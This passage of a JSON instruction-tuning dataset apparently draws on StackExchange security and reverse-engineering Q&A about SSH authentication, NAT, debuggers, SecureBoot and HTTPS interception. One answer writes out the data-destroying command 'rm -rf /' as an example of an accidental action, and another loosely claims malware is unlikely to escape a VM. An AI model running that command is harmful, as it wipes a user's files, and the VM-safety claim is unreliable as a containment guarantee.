      "answer": "Usually, symmetric encryption starts with a random initialization vector (IV). OpenPGP uses a slightly different cypher feedback mode with an all-zero IV, but the first two blocks are random.\nBecause of this, also the symmetric encryption is not deterministic; you cannot compare the plain text by comparing the encrypted message, the encrypted result is not deterministic any more."
    }
  },
  {
    "instruction": "What is the answer to this question - Java - Decipher encrypted classes in a jar file\nI have a couple of classes that are encrypted. The class loader must decrypt these before executing in the JVM.\nThe question is, how and where?\nWhat can I do to understand who is responsible to decrypt these classes before deploy?\n\n",
    "context": "",
    "output": "Find which of the visible classes implement java.lang.ClassLoader.\nThen you can look at its findClass and findResource implementation.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Java - Decipher encrypted classes in a jar file\nI have a couple of classes that are encrypted. The class loader must decrypt these before executing in the JVM.\nThe question is, how and where?\nWhat can I do to understand who is responsible to decrypt these classes before deploy?",
      "answer": "Find which of the visible classes implement java.lang.ClassLoader.\nThen you can look at its findClass and findResource implementation."
    }
  },
  {
    "instruction": "Answer the question below.\nunderstanding the \"Offering RSA public key\" step during SSH connection initialization\nDuring SSHv2 connection initialization, there is a following debug message:\ndebug1: Offering RSA public key: /home/user/.ssh/id_rsa\n\nAm I correct that actually no public key is sent to server? In addition, /home/user/.ssh/id_rsa is my private key. What exactly does this Offering RSA public key message mean?",
    "context": "",
    "output": "When the SSH client displays this message, it's trying to authenticate the user on the server (userauth_pubkey in sshconnect2.c). The client needs to demonstrate that it has the private key corresponding to a public key that is authorized on the server. The file name displayed in the debug message is the name of the private key file (e.g. passed as an argument to -i or as the IdentityFile configuration directive).\nAt the point where this message is displayed, the client doesn't use the private key, only the public key. However, the client wants to know that the private key is available, because if the server agrees to use this public key then the client will have to demonstrate that it knows the private key. The client sends an SSH_MSG_USERAUTH_REQUEST message to the server with the publickey method containing the public key. If the server agrees to use this public key (\u201cdebug1: Server accepts key\u201d) then the client will later use the private key to sign a challenge sent by the server in another SSH_MSG_USERAUTH_REQUEST message (in sign_and_send_pubkey \u2014\u00a0the have_sig byte changes from 0 (\u201ctell me if you like this key\u201d) to 1 (\u201chere's a proof that I'm me, let me in\u201d)).",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "understanding the \"Offering RSA public key\" step during SSH connection initialization\nDuring SSHv2 connection initialization, there is a following debug message:\ndebug1: Offering RSA public key: /home/user/.ssh/id_rsa\n\nAm I correct that actually no public key is sent to server? In addition, /home/user/.ssh/id_rsa is my private key. What exactly does this Offering RSA public key message mean?",
      "answer": "When the SSH client displays this message, it's trying to authenticate the user on the server (userauth_pubkey in sshconnect2.c). The client needs to demonstrate that it has the private key corresponding to a public key that is authorized on the server. The file name displayed in the debug message is the name of the private key file (e.g. passed as an argument to -i or as the IdentityFile configuration directive).\nAt the point where this message is displayed, the client doesn't use the private key, only the public key. However, the client wants to know that the private key is available, because if the server agrees to use this public key then the client will have to demonstrate that it knows the private key. The client sends an SSH_MSG_USERAUTH_REQUEST message to the server with the publickey method containing the public key. If the server agrees to use this public key (\u201cdebug1: Server accepts key\u201d) then the client will later use the private key to sign a challenge sent by the server in another SSH_MSG_USERAUTH_REQUEST message (in sign_and_send_pubkey \u2014\u00a0the have_sig byte changes from 0 (\u201ctell me if you like this key\u201d) to 1 (\u201chere's a proof that I'm me, let me in\u201d))."
    }
  },
  {
    "instruction": "What can an attacker do with an OpenID token\nSay an attacker had access to a list of OpenID tokens, what could the attacker leverage with that to access a system?\nWould they need to have another piece of information, MITM? Or can they just use that to authenticate.",
    "context": "",
    "output": "The token essentially is what gives you access for a certain amount of time. So, yes an attacker could use the token to access a system.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "What can an attacker do with an OpenID token\nSay an attacker had access to a list of OpenID tokens, what could the attacker leverage with that to access a system?\nWould they need to have another piece of information, MITM? Or can they just use that to authenticate.",
      "answer": "The token essentially is what gives you access for a certain amount of time. So, yes an attacker could use the token to access a system."
    }
  },
  {
    "instruction": "Answer this question:\n\nWhy do websites use HTTPS when they don't need to?\nThis has been bothering me for a while, but I have noticed that some websites (the first one that comes to mind is XKCD) use HTTPS for no apparent reason. I mean, XKCD is free and accessible to anyone. Why on earth would they encrypt your session when all you're doing is looking at comics? It seems like the cryptography would just consume resources unnecessarily. I'm not asking about XKCD specifically, but have noticed a few websites that do this and am wondering why they would.",
    "context": "",
    "output": "A: One answer is that SSL also prevents/deters MITM (Man-In-The-Middle) attacks.  In theory, SSL ensures that the message originated from XKCD and arrived to you without being tampered.  A bad actor who can intercept traffic between you and XKCD cannot inject code to run on your machine.\nJust based on the comments, being able to inject code to run client side is quite powerful.  You can glean a lot of information from this.  Furthermore, you can force a client browser to talk to pages/sites that it normally wouldn't.\nI do want to note, however, that SSL is not 100% in this case and there attacks such as sslstrip that can work around the fact that SSL is being used.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Why do websites use HTTPS when they don't need to?\nThis has been bothering me for a while, but I have noticed that some websites (the first one that comes to mind is XKCD) use HTTPS for no apparent reason. I mean, XKCD is free and accessible to anyone. Why on earth would they encrypt your session when all you're doing is looking at comics? It seems like the cryptography would just consume resources unnecessarily. I'm not asking about XKCD specifically, but have noticed a few websites that do this and am wondering why they would.",
      "answer": "One answer is that SSL also prevents/deters MITM (Man-In-The-Middle) attacks.  In theory, SSL ensures that the message originated from XKCD and arrived to you without being tampered.  A bad actor who can intercept traffic between you and XKCD cannot inject code to run on your machine.\nJust based on the comments, being able to inject code to run client side is quite powerful.  You can glean a lot of information from this.  Furthermore, you can force a client browser to talk to pages/sites that it normally wouldn't.\nI do want to note, however, that SSL is not 100% in this case and there attacks such as sslstrip that can work around the fact that SSL is being used."
    }
  },
  {
    "instruction": "Answer this question:\n\nList Relative Jump Destinations in IDA\nHow do I list all destinations from relative jump instructions (e.g. the jmpr instruction) in IDA?",
    "context": "",
    "output": "A: With your cursor on the given instruction, press Shift+F2 to bring up the IDC window, paste the following script into the script body pane, and press the Run button in the dialog window.\nauto x = Rfirst0(ScreenEA());\nwhile (x != BADADDR)\n{\n    Message(\"0x%08X\\n\", x);\n    x = Rnext0(ScreenEA(), x);\n}",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "List Relative Jump Destinations in IDA\nHow do I list all destinations from relative jump instructions (e.g. the jmpr instruction) in IDA?",
      "answer": "With your cursor on the given instruction, press Shift+F2 to bring up the IDC window, paste the following script into the script body pane, and press the Run button in the dialog window.\nauto x = Rfirst0(ScreenEA());\nwhile (x != BADADDR)\n{\n    Message(\"0x%08X\\n\", x);\n    x = Rnext0(ScreenEA(), x);\n}"
    }
  },
  {
    "instruction": "Question: How do I need to secure my Windows Shares?\nI am working on an Domain Controller / File Server on Windows Server 2012.\nLets say that I am from a school and that I have 3 OU's (or security groups)\n\nStudents\nStaff\nIT\n\nWhen I create a shared directory, where teachers can share some files with students. I always set the permissions to:\n\nShare Permissions:\n\nEveryone - Full Control\n\nNTFS Permissions: \n\nStudent - Read & Execute / Read\nStaff - Modify / Read & Execute  / Read / Write\nIT - Full Control\n\n\nI always do this, because of the \"windows least privilege management\"\nQuestions:\n\nFor example, when I use the shares on a computer without Windows, are they also secured by the NTFS permission?\nWhy are there two locations to change permissions and which location do I need to change?",
    "context": "",
    "output": "Answer: Q: non-Windows computer\nA: When you are connecting to shares on a Windows server, you are still secured by the combined share and NTFS permissions.  The reason for this is that even a non-Windows system must use a compatible client protocol to connect and use these shares, therefore it does not bypass share and NTFS security.  \nQ: Why share and NTFS permissions are both needed\nA: NTFS permissions secure the file system, whether the user is local or remote.  Share permissions specify what remote access is granted.  File shares use both technologies because they share resources on the file system for a remote user.  Your scenario is an overlap of both security mechanisms.  There are cases where you don't use both, like accessing files locally or sharing things other than the file system, like printers.  Though printers also have permissions similar to NTFS permissions.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How do I need to secure my Windows Shares?\nI am working on an Domain Controller / File Server on Windows Server 2012.\nLets say that I am from a school and that I have 3 OU's (or security groups)\n\nStudents\nStaff\nIT\n\nWhen I create a shared directory, where teachers can share some files with students. I always set the permissions to:\n\nShare Permissions:\n\nEveryone - Full Control\n\nNTFS Permissions: \n\nStudent - Read & Execute / Read\nStaff - Modify / Read & Execute  / Read / Write\nIT - Full Control\n\n\nI always do this, because of the \"windows least privilege management\"\nQuestions:\n\nFor example, when I use the shares on a computer without Windows, are they also secured by the NTFS permission?\nWhy are there two locations to change permissions and which location do I need to change?",
      "answer": "Q: non-Windows computer\nA: When you are connecting to shares on a Windows server, you are still secured by the combined share and NTFS permissions.  The reason for this is that even a non-Windows system must use a compatible client protocol to connect and use these shares, therefore it does not bypass share and NTFS security.  \nQ: Why share and NTFS permissions are both needed\nA: NTFS permissions secure the file system, whether the user is local or remote.  Share permissions specify what remote access is granted.  File shares use both technologies because they share resources on the file system for a remote user.  Your scenario is an overlap of both security mechanisms.  There are cases where you don't use both, like accessing files locally or sharing things other than the file system, like printers.  Though printers also have permissions similar to NTFS permissions."
    }
  },
  {
    "instruction": "Question: usercalls in old Win32 game\nI am currently analyzing an old Win32 game from 1999 that was probably compiled with Visual C++ 6 and was programmed in C.\nI noticed that there are almost no usercalls (i.e. calls that use registers to pass arguments) except for calls in the statically linked CRT library. Is this a reasonable assumption for a game of this age?\nTo identify registers used as function paramters I used an algorithm similar to the one described in this IDA blog post. The algorithm identifies PUSH/POP pairs and searches for registers usages before any assignment except in the PUSH/POP pairs.",
    "context": "",
    "output": "Answer: Yes, this sounds perfectly normal. If the program did not use C++, you won't see thiscall with usage of ecx but just standard stdcall or cdecl which use only stack for passing arguments.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "usercalls in old Win32 game\nI am currently analyzing an old Win32 game from 1999 that was probably compiled with Visual C++ 6 and was programmed in C.\nI noticed that there are almost no usercalls (i.e. calls that use registers to pass arguments) except for calls in the statically linked CRT library. Is this a reasonable assumption for a game of this age?\nTo identify registers used as function paramters I used an algorithm similar to the one described in this IDA blog post. The algorithm identifies PUSH/POP pairs and searches for registers usages before any assignment except in the PUSH/POP pairs.",
      "answer": "Yes, this sounds perfectly normal. If the program did not use C++, you won't see thiscall with usage of ecx but just standard stdcall or cdecl which use only stack for passing arguments."
    }
  },
  {
    "instruction": "What is the answer to this question - Nmap scanning computers behind a wireless modem\nLet's suppose that I have a router and three computers connected to Internet through that router.  When I tried to get the external IP address for each computer, I got the same address.  I think this is due to NAT translation.  I want to know how a hacker can scan a specific computer of the three computers using nmap and get all information about that specific one.\n\n",
    "context": "",
    "output": "For the most part, you can't.  NAT acts somewhat like a firewall with a \"default deny\" rule.  Unless you set up a DMZ or port forwarding, a computer on the \"internet\" side of the router cannot make unsolicited contact with the computers on the \"private\" side.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Nmap scanning computers behind a wireless modem\nLet's suppose that I have a router and three computers connected to Internet through that router.  When I tried to get the external IP address for each computer, I got the same address.  I think this is due to NAT translation.  I want to know how a hacker can scan a specific computer of the three computers using nmap and get all information about that specific one.",
      "answer": "For the most part, you can't.  NAT acts somewhat like a firewall with a \"default deny\" rule.  Unless you set up a DMZ or port forwarding, a computer on the \"internet\" side of the router cannot make unsolicited contact with the computers on the \"private\" side."
    }
  },
  {
    "instruction": "Can you tell me the answer to: How do I find address of a global variable in Ollydbg?\nI have the line\nCMP BYTE PTR DS:[EAX+1620], 0\n\nHow do I find the memory address of EAX+1620 so I can monitor it in ollydbg? I click it and nothing helpful comes up in the context box at the bottom of the window.\nScreenshot here, unnecessary info obscured:\n\nUsing Follow in Dump -> Selection on this line will take me to address 00A9612A, but I need to find EAX+1620",
    "context": "",
    "output": "answer: if eax is valid address you can follow in dump from the information pane \n(small pane between cpu window and dump window)\nsee screen shot",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How do I find address of a global variable in Ollydbg?\nI have the line\nCMP BYTE PTR DS:[EAX+1620], 0\n\nHow do I find the memory address of EAX+1620 so I can monitor it in ollydbg? I click it and nothing helpful comes up in the context box at the bottom of the window.\nScreenshot here, unnecessary info obscured:\n\nUsing Follow in Dump -> Selection on this line will take me to address 00A9612A, but I need to find EAX+1620",
      "answer": "if eax is valid address you can follow in dump from the information pane \n(small pane between cpu window and dump window)\nsee screen shot"
    }
  },
  {
    "instruction": "Q: Has a HTTP server access to SSL session ID?\nI want to know if a HTTP server (Apache, nginx etc.) can access a SSL/TLS session ID. Assume we have some hardware which does only SSL/TLS and behind a webserver which sends and receives the requests. Can the webserver \"see\" the SSL session ID. If not, how is the connection between the HTTP requests and the SSL session handled?",
    "context": "",
    "output": " A: Whether the SSL session identifier is made accessible, by your SSL hardware, to the rest of the server, is entirely up to the interface that this hardware offers.\nA decent SSL hardware box should offer some kind of session management, so that the consumer (your Apache / nginx / whatever server behind the box) may know whether successive connections are from the same client (i.e. the client reconnected, offered to do an \"abbreviated handshake\", and the box accepted because it still remembers the SSL session parameters). How this session management is offered is up to the box; it may or may not use the same \"session identifiers\" as what is exchanged in the SSL handshake (in the ClientHello and ServerHello messages). You will have to use to documentation for that box.\nIf the hardware does not offer session management of any kind, then it is junk and you should switch vendors.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Has a HTTP server access to SSL session ID?\nI want to know if a HTTP server (Apache, nginx etc.) can access a SSL/TLS session ID. Assume we have some hardware which does only SSL/TLS and behind a webserver which sends and receives the requests. Can the webserver \"see\" the SSL session ID. If not, how is the connection between the HTTP requests and the SSL session handled?",
      "answer": "Whether the SSL session identifier is made accessible, by your SSL hardware, to the rest of the server, is entirely up to the interface that this hardware offers.\nA decent SSL hardware box should offer some kind of session management, so that the consumer (your Apache / nginx / whatever server behind the box) may know whether successive connections are from the same client (i.e. the client reconnected, offered to do an \"abbreviated handshake\", and the box accepted because it still remembers the SSL session parameters). How this session management is offered is up to the box; it may or may not use the same \"session identifiers\" as what is exchanged in the SSL handshake (in the ClientHello and ServerHello messages). You will have to use to documentation for that box.\nIf the hardware does not offer session management of any kind, then it is junk and you should switch vendors."
    }
  },
  {
    "instruction": "Answer this question:\n\nIs it safe to install malware in a VM\nIs it safe to install malware in virtual machines? I would like to investigate malware, but I don't want to infect my own computer.\nCan I install the malware in a VMWare VM, maybe even without network access, without risking the integrity of my host system?",
    "context": "",
    "output": "A: I have not yet seen any in-the-wild malware that was designed to infect a host machine from within a VM.  I expect that most malware simply wouldn't care whether it is running on the bare hardware or within a VM since it can achieve its goals equally well in both cases.  It's probably safe to assume that malware won't escape a VM simply because it has no incentive to do so.\nThere are tools designed for containing and analysing malware and lots of information available on how to do this.  Also a couple of papers with techniques and tools.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is it safe to install malware in a VM\nIs it safe to install malware in virtual machines? I would like to investigate malware, but I don't want to infect my own computer.\nCan I install the malware in a VMWare VM, maybe even without network access, without risking the integrity of my host system?",
      "answer": "I have not yet seen any in-the-wild malware that was designed to infect a host machine from within a VM.  I expect that most malware simply wouldn't care whether it is running on the bare hardware or within a VM since it can achieve its goals equally well in both cases.  It's probably safe to assume that malware won't escape a VM simply because it has no incentive to do so.\nThere are tools designed for containing and analysing malware and lots of information available on how to do this.  Also a couple of papers with techniques and tools."
    }
  },
  {
    "instruction": "iOS Position-independent code and relocations\nI'm reversing few iOS Mach-O application executables these days and all of them use Position-independent code (PIC; the MH_PIC flag is set). I've been expecting a large number of relocation entries (just like with Windows PE or Android ELF) but all the executables contain zero relocations (well, at least the __text section I'm interested in).\nThe oficial docs say that this is because the segments are always located at a constant offset from each other and that makes sense to me.\nHowever, can I take this for granted? Do all typical iOS applications contain no relocations because all the code and data are usually located in one binary (i. e., dynamic libraries are usually not used)?",
    "context": "",
    "output": "The Mach-O format does support relocations but they appear rarely outside of the object files; usually linker does pretty good job using PIC addressing inside the final linked module. \nAs for imports from other libraries on iOS, they don't use relocations anymore but special tables handled by the dynamic loader (dyld). I've described how they work previously. For even more gruesome details see dyld sources and inspect actual binaries.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "iOS Position-independent code and relocations\nI'm reversing few iOS Mach-O application executables these days and all of them use Position-independent code (PIC; the MH_PIC flag is set). I've been expecting a large number of relocation entries (just like with Windows PE or Android ELF) but all the executables contain zero relocations (well, at least the __text section I'm interested in).\nThe oficial docs say that this is because the segments are always located at a constant offset from each other and that makes sense to me.\nHowever, can I take this for granted? Do all typical iOS applications contain no relocations because all the code and data are usually located in one binary (i. e., dynamic libraries are usually not used)?",
      "answer": "The Mach-O format does support relocations but they appear rarely outside of the object files; usually linker does pretty good job using PIC addressing inside the final linked module. \nAs for imports from other libraries on iOS, they don't use relocations anymore but special tables handled by the dynamic loader (dyld). I've described how they work previously. For even more gruesome details see dyld sources and inspect actual binaries."
    }
  },
  {
    "instruction": "Answer this question:\n\nSSTP VPN security feature\nDo we know exactly whether and for which parts of the packet confidentiality and integrity properties are guaranteed using SSTP VPN?\nSpecifically confidentiality is enforced on the header of the original packet? Integrity is enforced on the header of the original packet? Is integrity enforced on the header of the encapsulating packet?\nOr since it is a windows protocol we simply do not have access to this type of information?",
    "context": "",
    "output": "A: To cite from the public available protocol specification:\n\nThe following encapsulation operations occur on the client:\n\nApplication packets are encapsulated over any transport protocol (for example, TCP and UDP).\nTransport layer packets are encapsulated over a network protocol (for example, IP).\nNetwork layer packets are encapsulated over a PPP data-link layer.\nPPP packets are encapsulated over SSTP.\nSSTP Packets are encapsulated over SSL/TLS.\nSSL/TLS records are encapsulated over TCP.\nTCP packets are encapsulated over IP.\nIP packets are sent over any data-link layer (such as Ethernet or PPP). For more information about PPP, see [RFC1661].\n\n\nThus it is basically an inner IP tunnel with some non-encrypting encapsulation (PPP, SSTP) which then is transferred using TLS. Thus all of IP and above (TCP, application protocols, application payloads) are protected against sniffing and modification using TLS.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "SSTP VPN security feature\nDo we know exactly whether and for which parts of the packet confidentiality and integrity properties are guaranteed using SSTP VPN?\nSpecifically confidentiality is enforced on the header of the original packet? Integrity is enforced on the header of the original packet? Is integrity enforced on the header of the encapsulating packet?\nOr since it is a windows protocol we simply do not have access to this type of information?",
      "answer": "To cite from the public available protocol specification:\n\nThe following encapsulation operations occur on the client:\n\nApplication packets are encapsulated over any transport protocol (for example, TCP and UDP).\nTransport layer packets are encapsulated over a network protocol (for example, IP).\nNetwork layer packets are encapsulated over a PPP data-link layer.\nPPP packets are encapsulated over SSTP.\nSSTP Packets are encapsulated over SSL/TLS.\nSSL/TLS records are encapsulated over TCP.\nTCP packets are encapsulated over IP.\nIP packets are sent over any data-link layer (such as Ethernet or PPP). For more information about PPP, see [RFC1661].\n\n\nThus it is basically an inner IP tunnel with some non-encrypting encapsulation (PPP, SSTP) which then is transferred using TLS. Thus all of IP and above (TCP, application protocols, application payloads) are protected against sniffing and modification using TLS."
    }
  },
  {
    "instruction": "Can you tell me the answer to: How is the password prompt going to protect me from ruining my computer?\nOn Unix based systems, I'm often prompted to enter my password before installing or running a program.\nWhy does this protect me? \nIf I'm running a kiosk, I understand that a password might prevent someone else from messing with my computer. However, on my own computer, if I want to install something, entering my password won't stop me from running a virus or malicious program.",
    "context": "",
    "output": "answer: Prompting you to enter password is necessary to login into root account, enable user with higher rights. This is done just to prevent user from accidental actions like invalid command \"rm -rf /\". Sitting all the time under the root is not good idea - you really does not need such rights all the time you work. Also, it stops, prevents and decreases malicious stuff impact.\nIt is a part of Unix security model's philosophy.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How is the password prompt going to protect me from ruining my computer?\nOn Unix based systems, I'm often prompted to enter my password before installing or running a program.\nWhy does this protect me? \nIf I'm running a kiosk, I understand that a password might prevent someone else from messing with my computer. However, on my own computer, if I want to install something, entering my password won't stop me from running a virus or malicious program.",
      "answer": "Prompting you to enter password is necessary to login into root account, enable user with higher rights. This is done just to prevent user from accidental actions like invalid command \"rm -rf /\". Sitting all the time under the root is not good idea - you really does not need such rights all the time you work. Also, it stops, prevents and decreases malicious stuff impact.\nIt is a part of Unix security model's philosophy."
    }
  },
  {
    "instruction": "Does showing the permission level of an account to all users a bad security practice?\nOn my school website I can list all existing accounts in the system to send them a message. Each account has a logo showing the user role (admin, professor or student) and I can directly filter on it.\nAs I know some of these peoples are likely to click on a link I send them via chat. Is it a bad security practice ?\nOr the act to hide the roles only adds a minimal effort to threat actor ?",
    "context": "",
    "output": "Is it a bad security practice ?\n\nFor me this looks like the common trade-off between usability and security.\nHiding or obscuring information can help in security - sometimes a bit and sometimes a lot depending on how valuable these information are actually for the attacker and how easy they are to obtain in other ways.\nBut hiding or obscuring information also makes it harder for the intended user (i.e. not the attacker) and might greatly impact usability and indirectly the value of the system for the users. This might lead them to use other systems which are more convenient to use, this way bypassing the intended (and maybe monitored) processes - i.e. shadow IT. In other words: attempts to increase the security by decreasing usability might actually backfire and at the end reduce both usability and security.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Does showing the permission level of an account to all users a bad security practice?\nOn my school website I can list all existing accounts in the system to send them a message. Each account has a logo showing the user role (admin, professor or student) and I can directly filter on it.\nAs I know some of these peoples are likely to click on a link I send them via chat. Is it a bad security practice ?\nOr the act to hide the roles only adds a minimal effort to threat actor ?",
      "answer": "Is it a bad security practice ?\n\nFor me this looks like the common trade-off between usability and security.\nHiding or obscuring information can help in security - sometimes a bit and sometimes a lot depending on how valuable these information are actually for the attacker and how easy they are to obtain in other ways.\nBut hiding or obscuring information also makes it harder for the intended user (i.e. not the attacker) and might greatly impact usability and indirectly the value of the system for the users. This might lead them to use other systems which are more convenient to use, this way bypassing the intended (and maybe monitored) processes - i.e. shadow IT. In other words: attempts to increase the security by decreasing usability might actually backfire and at the end reduce both usability and security."
    }
  },
  {
    "instruction": "Answer this question:\n\nServer is returning an unrecognized error message?\nI've received reports of a strange error message (over HTTPS) that is not a part of my web application. The only thing I can think of is that it's coming from a proxy server. Is that possible? Can a proxy server intercept a request that is being sent over HTTPS and return a strange error before the request reaches it's intended destination?",
    "context": "",
    "output": "A: HTTPS intercepting proxies are commonplace in many companies. But also many desktop antivirus products ship with a proxy to intercept and scan HTTPS traffic. And sometimes malware does it too. These proxies can then scan, modify or replace any traffic. This is used for valid purposes to block malware or data leakage (which might result in the strange errors you see) and for invalid purposes for example to inject advertisement into the traffic.\nSee also Is it common practice for companies to MITM HTTPS traffic?.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Server is returning an unrecognized error message?\nI've received reports of a strange error message (over HTTPS) that is not a part of my web application. The only thing I can think of is that it's coming from a proxy server. Is that possible? Can a proxy server intercept a request that is being sent over HTTPS and return a strange error before the request reaches it's intended destination?",
      "answer": "HTTPS intercepting proxies are commonplace in many companies. But also many desktop antivirus products ship with a proxy to intercept and scan HTTPS traffic. And sometimes malware does it too. These proxies can then scan, modify or replace any traffic. This is used for valid purposes to block malware or data leakage (which might result in the strange errors you see) and for invalid purposes for example to inject advertisement into the traffic.\nSee also Is it common practice for companies to MITM HTTPS traffic?."
    }
  },
  {
    "instruction": "How far can we go in preventing videos from spreading out using P2P networks like BitTorrent?\nEveryday, I see many of my friends downloading movies off P2P networks like BitTorrent. Isn't there any way for those hardworking movie producers to save their work from being distributed like this?\nAs a security enthusiast, I'm interested in knowing the technical methodologies for stopping the files from spreading over BitTorrents. I know securing 100% is not possible, but how far can we really go? Or, how difficult can we make it?\nPS: I've heard that there are some security companies which protect movies from being spread over internet (I guess that includes torrents too?). I wonder how they do it?",
    "context": "",
    "output": "Convenience:\n\nOffering good codecs\nNOT Preventing DVD players from fast forwarding through FBI warnings and 15 minutes of marketing\nEasy distribution: kindle, itunes, etc\nAllowing fair use:  CSS (DMCA), moving between devices, no region locks, etc\nReasonable pricing for electronic goods\n\nIf there is more value in buying the good then downloading from shadowy networks, people will buy.  I remember being so pissed that the Harry potter video had 20 minutes of DVD locked previews that I wished I would have pirated it instead.  \nDon't treat the customer as the enemy.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How far can we go in preventing videos from spreading out using P2P networks like BitTorrent?\nEveryday, I see many of my friends downloading movies off P2P networks like BitTorrent. Isn't there any way for those hardworking movie producers to save their work from being distributed like this?\nAs a security enthusiast, I'm interested in knowing the technical methodologies for stopping the files from spreading over BitTorrents. I know securing 100% is not possible, but how far can we really go? Or, how difficult can we make it?\nPS: I've heard that there are some security companies which protect movies from being spread over internet (I guess that includes torrents too?). I wonder how they do it?",
      "answer": "Convenience:\n\nOffering good codecs\nNOT Preventing DVD players from fast forwarding through FBI warnings and 15 minutes of marketing\nEasy distribution: kindle, itunes, etc\nAllowing fair use:  CSS (DMCA), moving between devices, no region locks, etc\nReasonable pricing for electronic goods\n\nIf there is more value in buying the good then downloading from shadowy networks, people will buy.  I remember being so pissed that the Harry potter video had 20 minutes of DVD locked previews that I wished I would have pirated it instead.  \nDon't treat the customer as the enemy."
    }
  },
  {
    "instruction": "Please answer this question: Does disabling right click have any impact on security?\nOn a banking website I see that they have disabled right-click. Does that make the site any more secure? Is it a good general practice?",
    "context": "",
    "output": "Does it make the site any more secure?\n\nNo, it doesn't alter anything other than your ability to conveniently save items from a page. Using a browser's developer mode, turning off JS, overriding this with a different script that disables that pop-up, or just grabbing data off the wire after stripping the SSL will all work.\n\nIs it a good general practice?\n\nThis is an ache that the Internet has had to suffer from the height of GeoCities fame when folks didn't want you to \"steal\" their very poorly composed photos of dandelions and family pets. Dispensing all professionalism and being straight-forward as possible, I might hesitate to convict a person for smacking the responsible party of any modern site using this upside the head with a cast iron skillet. Aside from that it has generally fallen out of favor due to being a combination of ineffective and annoying. For instance, it would also make my spellchecker misbehave.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Does disabling right click have any impact on security?\nOn a banking website I see that they have disabled right-click. Does that make the site any more secure? Is it a good general practice?",
      "answer": "Does it make the site any more secure?\n\nNo, it doesn't alter anything other than your ability to conveniently save items from a page. Using a browser's developer mode, turning off JS, overriding this with a different script that disables that pop-up, or just grabbing data off the wire after stripping the SSL will all work.\n\nIs it a good general practice?\n\nThis is an ache that the Internet has had to suffer from the height of GeoCities fame when folks didn't want you to \"steal\" their very poorly composed photos of dandelions and family pets. Dispensing all professionalism and being straight-forward as possible, I might hesitate to convict a person for smacking the responsible party of any modern site using this upside the head with a cast iron skillet. Aside from that it has generally fallen out of favor due to being a combination of ineffective and annoying. For instance, it would also make my spellchecker misbehave."
    }
  },
  {
    "instruction": "Answer this question:\n\nWill secure boot prevent any non signed firmware from running?\nWonder if secure boot can protect my computer from usb drives with infected firmware after Debian os is booted ?",
    "context": "",
    "output": "A: TL,DR: No. USB drive firmware runs on the USB drive, not on the computer.\nLong answer: It can do nothing because SecureBoot only secures the boot (hence the name) and once the OS is running, it does nothing anymore.\nIf by \"infected firmware\" you mean BadUSB, the OS can protect itself from it and SecureBoot does nothing at all. BadUSB means a USB device exposes multiple device profiles (Mass storage, network card, HID device) in order to execute actions (not code) on the OS.\nWhat actions? The most basic are sending keystrokes to execute programs, and creating a new network device with a DNS with a higher priority than the correct one.\nThe OS can have a whitelist of allowed devices, and don't enable devices that aren't on the list. If you are not expecting to use a USB mouse, you can block USB mice from being allowed.\nIf the infected firmware is there to corrupt files, hide files from the OS, or something like that, the OS cannot do anything, and SecureBoot cannot do anything. The OS does not have any execution powers inside the processing chip on the USB device, and SecureBoot task ends when the control is passed to the OS.\nIf you are confusing \"firmware\" and \"driver\", SecureBoot can't do anything at all (see above), and the OS is the one that can have mechanisms to protect itself from the installation of rogue firmware.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Will secure boot prevent any non signed firmware from running?\nWonder if secure boot can protect my computer from usb drives with infected firmware after Debian os is booted ?",
      "answer": "TL,DR: No. USB drive firmware runs on the USB drive, not on the computer.\nLong answer: It can do nothing because SecureBoot only secures the boot (hence the name) and once the OS is running, it does nothing anymore.\nIf by \"infected firmware\" you mean BadUSB, the OS can protect itself from it and SecureBoot does nothing at all. BadUSB means a USB device exposes multiple device profiles (Mass storage, network card, HID device) in order to execute actions (not code) on the OS.\nWhat actions? The most basic are sending keystrokes to execute programs, and creating a new network device with a DNS with a higher priority than the correct one.\nThe OS can have a whitelist of allowed devices, and don't enable devices that aren't on the list. If you are not expecting to use a USB mouse, you can block USB mice from being allowed.\nIf the infected firmware is there to corrupt files, hide files from the OS, or something like that, the OS cannot do anything, and SecureBoot cannot do anything. The OS does not have any execution powers inside the processing chip on the USB device, and SecureBoot task ends when the control is passed to the OS.\nIf you are confusing \"firmware\" and \"driver\", SecureBoot can't do anything at all (see above), and the OS is the one that can have mechanisms to protect itself from the installation of rogue firmware."
    }
  },
  {
    "instruction": "Answer the following question:\n\nFinding \"free\" inside libc.so\nI extracted the libc.so.6 from within a vulnerable image used for exploitation purposes. I open up the shared object in IDA and I look at the symbols inside the \"Exports\" tab. I find \"free\"; upon visiting the function however, its body seems to do something rather different from what I'd expect from a dlmalloc free implementation. What am I missing?",
    "context": "",
